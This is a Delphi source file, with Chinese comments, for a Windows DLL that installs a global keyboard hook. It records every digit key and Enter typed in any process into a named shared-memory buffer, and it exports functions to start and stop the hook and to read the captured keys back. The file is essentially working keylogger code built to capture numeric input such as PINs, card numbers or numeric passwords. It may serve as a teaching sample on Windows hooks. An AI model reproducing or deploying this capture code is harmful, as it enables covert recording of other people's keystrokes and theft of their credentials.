unit U_HookDLL;

interface

uses
  Windows, Messages, SysUtils;

const
  BUFFER_SIZE = 16 * 1024;                  //文件映射到内存的大小
  HOOK_MEM_FILENAME = 'MEM_FILE';           //映像文件名称
  HOOK_MUTEX_NAME = 'MUTEX_NAME';           //互斥名称

type
  //共享数据结构
  TShared = record
    Keys: array[0..BUFFER_SIZE - 1] of ShortString;
    KeyCount: Integer;
  end;
  //共享数据结构指针
  PShared = ^TShared;

var
  MemFile, HookMutex: THandle;              //文件句柄和互斥句柄
  hOldKeyHook: HHook;                       //钩子变量
  Shared: PShared;                          //共享变量

implementation

//键盘钩子回调函数
function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
  stdcall; export;
var
  vKey: Integer;
  TmpStr: ShortString;
begin
  if iCode < 0 then
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
  else
  begin
    if (iCode = HC_ACTION) or (iCode = HC_NOREMOVE) then
    begin
      //获取按键的Virtual Key Code
      vKey := wParam;
      //判断按键是否处于按下状态
      if GetAsyncKeyState(vKey) = -32767 then
      begin
        TmpStr := '';

        case vKey of
          13:  TmpStr := '[Enter]';

          //Number: 0, 1, 2, 3, 4, 5, 6, 7, 8, 9
          48:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '0';

          49:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '1';

          50:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '2';

          51:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '3';

          52:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '4';

          53:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '5';

          54:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '6';

          55:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '7';

          56:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '8';

          57:  if GetKeyState(VK_SHIFT) >= 0 then
                 TmpStr := '9';

          //NumberPad
          96..105:
               //Number: 0..9
               TmpStr := IntToStr(vKey - 96);
        end;

        if TmpStr <> '' then
        begin
          //将获取的按键信息写入缓冲区
          Shared^.Keys[Shared^.KeyCount] := TmpStr;
          Inc(Shared^.KeyCount);

          //缓冲区满时清空
          if Shared^.KeyCount > BUFFER_SIZE - 1 then
            Shared^.KeyCount := 0;
        end;
      end;
    end;

    //将按键信息继续传递下去
    Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam);
  end;
end;

//安装键盘钩子
function EnableKeyHook: BOOL; export;
begin
  Shared^.KeyCount := 0;

  if hOldKeyHook = 0 then
  begin
    //WH_KEYBOARD:键盘钩子, KeyHookProc:回调函数, HInstance:回调函数实例, 线程ID
    hOldKeyHook := SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, HInstance, 0);
  end;

  Result := (hOldKeyHook <> 0);
end;

//卸载键盘钩子
function DisableKeyHook: BOOL; export;
begin
  if hOldKeyHook <> 0 then
  begin
    UnHookWindowsHookEx(hOldKeyHook);
    hOldKeyHook := 0;
    Shared^.KeyCount := 0;
  end;

  Result := (hOldKeyHook = 0);
end;

//返回捕获的按键个数
function GetKeyCount: Integer; export;
begin
  Result := Shared^.KeyCount;
end;

//返回指定按键
function GetKey(Index: Integer): ShortString; export;
begin
  Result := '';

  if (Index > -1) and (Index < BUFFER_SIZE) then
    Result := Shared^.Keys[Index];
end;

//清空存放按键的缓冲区
procedure ClearKeyString; export;
begin
  Shared^.KeyCount := 0;
end;

//导出函数列表
exports
  EnableKeyHook,
  DisableKeyHook,
  GetKeyCount,
  ClearKeyString,
  GetKey;

initialization
  //创建互斥变量, 只允许一个进程使用此DLL
  HookMutex := CreateMutex(nil, True, HOOK_MUTEX_NAME);

  //打开文件映像
  MemFile := OpenFileMapping(FILE_MAP_WRITE, False, HOOK_MEM_FILENAME);

  //如果不存在该文件映像则重新创建
  if MemFile = 0 then
    MemFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0,
      SizeOf(TShared), HOOK_MEM_FILENAME);

  //文件映射内存
  Shared := MapViewOfFile(MemFile, File_MAP_WRITE, 0, 0, 0);

  //释放互斥变量
  ReleaseMutex(HookMutex);

  //关闭互斥句柄
  CloseHandle(HookMutex);

finalization
  //卸载键盘钩子
  if hOldKeyHook <> 0 then
    DisableKeyHook;

  //释放映射
  UnMapViewOfFile(Shared);

  //关闭映像文件句柄
  CloseHandle(MemFile);

end.